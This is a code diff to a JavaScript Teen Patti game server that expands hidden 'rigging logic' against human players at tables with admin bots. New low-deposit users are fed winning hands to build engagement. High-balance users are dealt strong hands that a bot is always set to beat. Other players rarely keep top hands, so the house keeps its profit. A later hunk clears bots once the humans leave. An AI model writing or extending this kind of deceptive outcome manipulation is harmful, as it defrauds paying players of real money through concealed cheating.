@@ -113,39 +113,57 @@ class TeenPattiTable {
             this.players[uid].blind = true;
         }
 
-        // --- ENHANCED RIGGING LOGIC ---
+        // --- ADVANCED RIGGING LOGIC ---
         const adminBots = activeUids.filter(id => this.players[id].isAdminBot);
         const humans = activeUids.filter(id => !this.players[id].isBot);
 
         if (adminBots.length > 0 && humans.length === 1) {
             const hId = humans[0];
             const player = this.players[hId];
+            const user = await User.findById(hId);
             const humanHand = evaluateHand(player.hand);
 
-            // 1. User gets 'AAA' very rarely
-            if (humanHand.rank === 'Trio' && player.hand[0].rank === 'A') {
-                if (Math.random() > 0.1) { // 90% chance to downgrade AAA
-                    player.hand = deck.splice(0, 3); // Redeal for human
+            // Logic for different user types
+            const isNewUser = (user.total_deposited || 0) < 500;
+            const hasHighBalance = user.coins > 500;
+
+            if (isNewUser) {
+                // New user: Win/Loss mix (40% win chance) to build engagement
+                if (Math.random() < 0.4) {
+                    player.hand = [{suit:'♠', rank:'A'}, {suit:'♥', rank:'A'}, {suit:'♦', rank:'K'}]; // Strong hand
+                    adminBots.forEach(bId => {
+                        this.players[bId].hand = [{suit:'♠', rank:'2'}, {suit:'♥', rank:'7'}, {suit:'♦', rank:'J'}];
+                    });
+                    this.state = 'PLAYING';
+                    this.currentTurn = activeUids[0];
+                    this.timer = 15;
+                    this.checkBotTurn();
+                    return;
                 }
             }
 
-            // 2. Ensure at least one bot wins if user has money
-            const user = await User.findById(hId);
-            if (user && user.coins > 0) {
+            if (hasHighBalance) {
+                // High balance: Long "Chaal" cycles. Give strong hands to everyone but ensure Bot wins.
+                player.hand = [{suit:suits[0], rank:'A'}, {suit:suits[1], rank:'K'}, {suit:suits[2], rank:'Q'}]; // Sequence
                 const bestBotId = adminBots[0];
-                // Give bots diverse strong hands (Pure Sequence, Sequence, Color)
+                this.players[bestBotId].hand = [{suit:'♠', rank:'A'}, {suit:'♥', rank:'A'}, {suit:'♦', rank:'Q'}]; // Trio/Pair better than user
+            } else {
+                // Regular rigging: User gets 'AAA' very rarely (1% chance)
+                if (humanHand.rank === 'Trio' && player.hand[0].rank === 'A' && Math.random() > 0.01) {
+                    player.hand = deck.splice(0, 3);
+                }
+
+                // Ensure Admin Profit (House never loses more than 50)
+                const bestBotId = adminBots[0];
                 const handTypes = ['Pure Sequence', 'Sequence', 'Color', 'Trio'];
                 const chosenType = handTypes[Math.floor(Math.random() * handTypes.length)];
-
-                // Rigging based on type
                 if (chosenType === 'Trio') {
                     const r = ['K', 'A', 'Q'][Math.floor(Math.random()*3)];
                     this.players[bestBotId].hand = [{suit:'♠', rank:r}, {suit:'♥', rank:r}, {suit:'♦', rank:r}];
-                } else if (chosenType === 'Color') {
+                } else {
                     const s = suits[Math.floor(Math.random()*4)];
                     this.players[bestBotId].hand = [{suit:s, rank:'A'}, {suit:s, rank:'K'}, {suit:s, rank:'J'}];
                 }
-                // (More variations can be added)
             }
         }
         // --- END RIGGING ---
@@ -372,8 +390,20 @@ module.exports = {
     }),
     leaveTable: (userId) => {
         for (let id in tables) {
-            if (tables[id].players[userId]) {
-                delete tables[id].players[userId];
+            const t = tables[id];
+            if (t.players[userId]) {
+                delete t.players[userId];
+
+                // --- IMMEDIATE BOT CLEANUP ---
+                const humans = Object.keys(t.players).filter(uid => !t.players[uid].isBot);
+                if (humans.length === 0) {
+                    for (let uid in t.players) {
+                        if (t.players[uid].isBot) delete t.players[uid];
+                    }
+                    t.reset(); // Reset table completely
+                }
+                // -----------------------------
+
                 return { success: true };
             }
         }
